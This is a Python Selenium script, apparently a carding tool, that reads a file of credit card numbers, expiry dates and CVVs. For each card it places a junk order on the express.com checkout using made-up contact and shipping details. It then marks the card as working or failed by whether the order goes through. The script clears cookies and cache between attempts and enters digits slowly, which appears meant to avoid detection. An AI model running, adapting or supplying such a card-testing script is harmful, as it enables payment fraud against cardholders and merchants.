import time
import tkinter as tk
from tkinter import filedialog, simpledialog
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import msvcrt  # Solo necesario en sistemas Windows
import sys
import logging
# Configurar el nivel de registro global
logging.basicConfig(level=logging.WARNING)
# Deshabilitar mensajes de advertencia de WebDriver, urllib3 y otros mensajes irrelevantes
logging.getLogger("selenium").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)


# Redirigir la salida de error estándar a nul en sistemas Windows
sys.stderr = open('nul', 'w')


# Opciones de Chrome
chrome_options = Options()
chrome_options.add_argument("--log-level=3")  # Esto establece el nivel de registro de Chrome a "sin registro"
#chrome_options.add_argument("--headless")  # Asegúrate de que esta línea esté descomentada para ejecutar en modo headless
#chrome_options.add_argument("--disable-gpu")  # Esta opción es necesaria para el modo headless
chrome_options.add_argument('--disable-web-security')
# Ahora puedes pasar las chrome_options al constructor de Chrome WebDriver
driver = webdriver.Chrome(options=chrome_options)
driver.minimize_window()

def express(card, date, cvv):
    driver.get("https://www.express.com/clothing/men/phoenix-paisley-dress-socks/pro/04626303/color/Pitch%20Black/")
    # Cierra la ventana de cookies
    try:
            # Intenta encontrar y hacer clic en el botón 'No thanks' si está presente
        no_thanks_button = WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "button.fsrButton.fsrButton__inviteDecline.fsrDeclineButton"))
        )
        no_thanks_button.click()
    except TimeoutException as e:
        #Si el botón 'No thanks' no está presente o no es clickeable, ignora la excepción y continúa
      pass
    
    try:
        WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.ID, 'onetrust-close-btn-container'))
        ).click()
    except TimeoutException as e:
        WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.ID, 'onetrust-close-btn-container'))
        ).click()
                
    try:
        time.sleep(1)
        driver.execute_script('document.querySelector("button[unbxdattr=\'AddToCart\']").click();')
        #print("Se hizo clic en el botón 'Agregar al carrito' de forma forzosa.")
    except TimeoutException as e:
        driver.get("https://www.express.com/clothing/men/red-paisley-dress-socks/pro/04626305/color/BURGUNDY/")
        time.sleep(1)
        driver.execute_script('document.querySelector("button[unbxdattr=\'AddToCart\']").click();')
        #print("Se hizo clic en el botón 'Agregar al carrito' de forma forzosa.")

    #cerrar_mensaje(driver)
    driver.get("https://express.com/bag")

    # Espera hasta que el botón 'continue-to-checkout' sea clickeable
    time.sleep(1.5)
    driver.execute_script('document.querySelector("#continue-to-checkout").click();')
    #print("Se hizo clic en el botón de 'Continuar con el pago' de forma forzosa.")

    #cerrar_mensaje(driver)
    try:
       # Intenta encontrar y hacer clic en el botón 'close' si está presente
       button = WebDriverWait(driver, 4).until(
           EC.element_to_be_clickable((By.CSS_SELECTOR, "button.close_button-240494-button.close_button-240494-button-d2.bluecoreCloseButton"))
       )
       button.click()
    except TimeoutException as e:
       # Si el botón 'close' no está presente o no es clickeable, ignora la excepción y continúa
       pass

    driver.get("https://www.express.com/checkout/contact-information")
    #cerrar_mensaje(driver)

    try:
        # Intenta encontrar y hacer clic en el botón 'No thanks' si está presente
        no_thanks_button = WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "button.fsrButton.fsrButton__inviteDecline.fsrDeclineButton"))
        )
        no_thanks_button.click()
    except TimeoutException as e:
    #    # Si el botón 'No thanks' no está presente o no es clickeable, ignora la excepción y continúa
    #    print("")
        pass


    #cerrar_mensaje(driver)
    try:
        input_FirstName = WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@class='C-KSdhEJ YMB2H' and @id='contact-information-firstname']"))
        )
        input_FirstName.send_keys("dsadsad")
    except TimeoutException as e:
        input_FirstName = WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@class='C-KSdhEJ YMB2H' and @id='contact-information-firstname']"))
        )
        input_FirstName.send_keys("dsadsad")


    try:
        input_LastName = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ YMB2H' and @id='contact-information-lastname']"))
        )
        input_LastName.send_keys("dsadsad")
    except TimeoutException as e:
        input_LastName = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ YMB2H' and @id='contact-information-lastname']"))
        )
        input_LastName.send_keys("dsadsad")
    
    try:
        input_mail = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ mBaDI' and @id='contact-information-email']"))
        )
        input_mail.send_keys("dawdwafafw@gmail.com")
    except TimeoutException as e:
        input_mail = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ mBaDI' and @id='contact-information-email']"))
        )
        input_mail.send_keys("dawdwafafw@gmail.com")
        
    try:
        input_Confirmmail = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ mBaDI' and @id='contact-information-confirmemail']"))
        )
        input_Confirmmail.send_keys("dawdwafafw@gmail.com")
    except TimeoutException as e:
        input_Confirmmail = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ mBaDI' and @id='contact-information-confirmemail']"))
        )
        input_Confirmmail.send_keys("dawdwafafw@gmail.com")
    
    try:
        input_number = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ r3Bel' and @id='contact-information-phone']"))
        )
        input_number.send_keys("(213) 231-2321")
    except TimeoutException as e:
        input_number = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ r3Bel' and @id='contact-information-phone']"))
        )
        input_number.send_keys("(213) 231-2321")
    
    try:
        WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.XPATH, "//button[@class='btn VgwgDBBL i31kbSky a-YwkJU2 _0TgAT XeI2t' and not(@aria-label)]"))
        ).click()
    except TimeoutException as e:
        WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.XPATH, "//button[@class='btn VgwgDBBL i31kbSky a-YwkJU2 _0TgAT XeI2t' and not(@aria-label)]"))
        ).click()
    



    try:
        input_street = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ QmZ+J' and @id='shipping.line1']"))
        )
        input_street.send_keys("dwqdqwfqwfqwfqw")
    except TimeoutException as e:
        input_street = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ QmZ+J' and @id='shipping.line1']"))
        )
        input_street.send_keys("dwqdqwfqwfqwfqw")

    try:
        input_zipcode = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ n9hK0' and @id='shipping.postalCode']"))
        )
        input_zipcode.send_keys("231232")
    except TimeoutException as e:
        input_zipcode = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ n9hK0' and @id='shipping.postalCode']"))
        )
        input_zipcode.send_keys("231232")

    try:
        input_city = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ vwtDb' and @id='shipping.city']"))
        )
        input_city.send_keys("dawdsaf")
    except TimeoutException as e:
        input_city = WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//input[@class='C-KSdhEJ vwtDb' and @id='shipping.city']"))
        )
        input_city.send_keys("dawdsaf")
    
    try:
        WebDriverWait(driver, 4).until(
        EC.element_to_be_clickable((By.XPATH, "//button[@class='btn VgwgDBBL i31kbSky a-YwkJU2 _0TgAT Rpw9i' and not(@aria-label)]"))
        ).click()
    except TimeoutException as e:
        WebDriverWait(driver, 4).until(
        EC.element_to_be_clickable((By.XPATH, "//button[@class='btn VgwgDBBL i31kbSky a-YwkJU2 _0TgAT Rpw9i' and not(@aria-label)]"))
        ).click()
    
    try:
        WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.XPATH, "//button[@class='btn VgwgDBBL i31kbSky a-YwkJU2 _0TgAT vX8Q2' and not(@aria-label)]"))
        ).click()
    except TimeoutException as e:
        WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.XPATH, "//button[@class='btn VgwgDBBL i31kbSky a-YwkJU2 _0TgAT vX8Q2' and not(@aria-label)]"))
        ).click()

    try:
         # Esperar hasta que el iframe esté presente y luego cambiar al iframe por ID
         WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.ID, "aurusIframe")))
         driver.switch_to.frame("aurusIframe")
         
         # Esperar a que el elemento input sea localizable por su ID y luego obtenerlo
         input_card = WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.ID, "cNumber")))
         input_card.clear()
         for digit in card:  # Ingresar cada dígito de la tarjeta uno por uno
             input_card.send_keys(digit)
             time.sleep(0.2)  # Espera medio segundo entre cada dígito
     
         input_date = WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.ID, "exDate")))
         input_date.clear()
         for digit in date:  # Ingresar cada dígito de la fecha uno por uno
             input_date.send_keys(digit)
             time.sleep(0.2)  # Espera medio segundo entre cada dígito
     
         input_cvv = WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.ID, "secCode")))
         input_cvv.clear()
         for digit in cvv:  # Ingresar cada dígito del CVV uno por uno
             input_cvv.send_keys(digit)
             time.sleep(0.2)  # Espera medio segundo entre cada dígito
         
         driver.switch_to.default_content()
            
    except TimeoutException:
        pass
    #   print("El elemento no fue encontrado en el tiempo establecido: ", e)
    try:
        # Espera hasta que el botón con las clases especificadas y sin un atributo aria-label sea clickeable
        button = WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(@class, 'VgwgDBBL') and contains(@class, 'i31kbSky') and contains(@class, 'a-YwkJU2') and contains(@class, '_0TgAT') and not(@aria-label)]"))
        )
        # Hacer clic en el botón
        button.click()
    except TimeoutException:
    #    print("El botón no fue encontrado o no era clickeable en el tiempo establecido.")
                 # Esperar hasta que el iframe esté presente y luego cambiar al iframe por ID
        WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.ID, "aurusIframe")))
        driver.switch_to.frame("aurusIframe")
        
        # Esperar a que el elemento input sea localizable por su ID y luego obtenerlo
        input_card = WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.ID, "cNumber")))
        input_card.clear()
        for digit in card:  # Ingresar cada dígito de la tarjeta uno por uno
            input_card.send_keys(digit)
            time.sleep(0.2)  # Espera medio segundo entre cada dígito
    
        input_date = WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.ID, "exDate")))
        input_date.clear()
        for digit in date:  # Ingresar cada dígito de la fecha uno por uno
            input_date.send_keys(digit)
            time.sleep(0.2)  # Espera medio segundo entre cada dígito
    
        input_cvv = WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.ID, "secCode")))
        input_cvv.clear()
        for digit in cvv:  # Ingresar cada dígito del CVV uno por uno
            input_cvv.send_keys(digit)
            time.sleep(0.2)  # Espera medio segundo entre cada dígito
        
        driver.switch_to.default_content()

        button = WebDriverWait(driver, 7).until(
        EC.element_to_be_clickable((By.XPATH, "//button[contains(@class, 'VgwgDBBL') and contains(@class, 'i31kbSky') and contains(@class, 'a-YwkJU2') and contains(@class, '_0TgAT') and not(@aria-label)]"))
        )
        # Hacer clic en el botón
        button.click()
        
    try:
    # Espera hasta que el botón con las clases especificadas sea clickeable
        button = WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "button.btn.VgwgDBBL.i31kbSky.a-YwkJU2._0TgAT.p2TWK"))
        )
        # Hacer clic en el botón
        button.click()
    except TimeoutException:
    #    print("El botón 'Place Order' no fue encontrado o no era clickeable en el tiempo establecido.")
        button = WebDriverWait(driver, 4).until(
        EC.element_to_be_clickable((By.CSS_SELECTOR, "button.btn.VgwgDBBL.i31kbSky.a-YwkJU2._0TgAT.p2TWK"))
        )
        # Hacer clic en el botón
        button.click()

    try:
        # Verifica si el encabezado 'Delivery Details' está presente
        WebDriverWait(driver, 4).until(
            EC.presence_of_element_located((By.XPATH, "//h2[contains(@class, 'lixW-')]"))
        )

        #print("Se encontró el encabezado 'Delivery Details'.")
        formatted_date = f"{date[:2]}|20{date[2:]}"
        print("\033[92m" + f"{card}|{formatted_date}|{cvv}" + "\033[0m")
        driver.delete_all_cookies()
        limpiar_cache()
    except (TimeoutException, NoSuchElementException):
        formatted_date = f"{date[:2]}|20{date[2:]}"
        print("\033[91m" + f"{card}|{formatted_date}|{cvv}" + "\033[0m")
        driver.delete_all_cookies()
        limpiar_cache()

def cerrar_mensaje(driver):
    try:
        WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.CSS_SELECTOR, ".icon-close")))
        driver.execute_script('document.querySelector(".icon-close").click();')
        print("Diálogo cerrado.")
    except Exception as e:
        print("No se pudo cerrar el diálogo")


def seleccionar_archivo():
    root = tk.Tk()
    root.withdraw()
    return filedialog.askopenfilename()


def write_to_file(text):
    with open('output.txt', 'a') as file:  # 'a' es para modo de agregar
        file.write(text + "\n")

def limpiar_cache():
    # Esta función maneja la limpieza de la caché del navegador.
    driver.get('chrome://settings/clearBrowserData')
    acciones = webdriver.ActionChains(driver)
    acciones.send_keys(Keys.TAB * 3 + Keys.DOWN * 3)
    acciones.perform()
    acciones = webdriver.ActionChains(driver)
    acciones.send_keys(Keys.ENTER)
    acciones.perform()


def cargar_cards(ruta_archivo):
    # Esta función carga las credenciales desde un archivo txt.
    credenciales = []
    with open(ruta_archivo, 'r', encoding='utf-8') as archivo:
        for linea in archivo:
            partes = linea.strip().split('|')
            if len(partes) != 4:
                print("El archivo no está en el formato correcto. Debe ser 'Card|MM|AAAA|CVV'.")
                return None
            card = partes[0]
            exp_date = partes[1] + partes[2][2:]  # Tomamos el mes y los últimos dos dígitos del año
            cvv = partes[3]
            credenciales.append((card, exp_date, cvv))
    return credenciales

def main():
    ruta_archivo = seleccionar_archivo()
    if not ruta_archivo:
        print("No se seleccionó ningún archivo.")
        return

    credenciales = cargar_cards(ruta_archivo)
    #credenciales = cargar_cards('cards.txt')
    if credenciales is None:
        print("Por favor, asegúrese de que el archivo este en el formato correcto")
        return

    for card, date, cvv in credenciales:
        express(card, date, cvv)
        time.sleep(1)  # Retardo entre cada intento de inicio de sesión

    driver.quit()


if __name__ == "__main__":
    main()
    # Esperar a que el usuario presione una tecla específica antes de cerrar la consola
    print("Asegure y guarde las credenciales. Presiona la tecla 'q' para cerrar la consola.")
    while True:
        key = msvcrt.getch().decode('utf-8').lower()
        if key == 'q':
            break
# Autor: Rizzo
# Fecha de creación: 2024-01-14
# Derechos de autor: (C) 2024 Rizzo. Todos los derechos reservados.

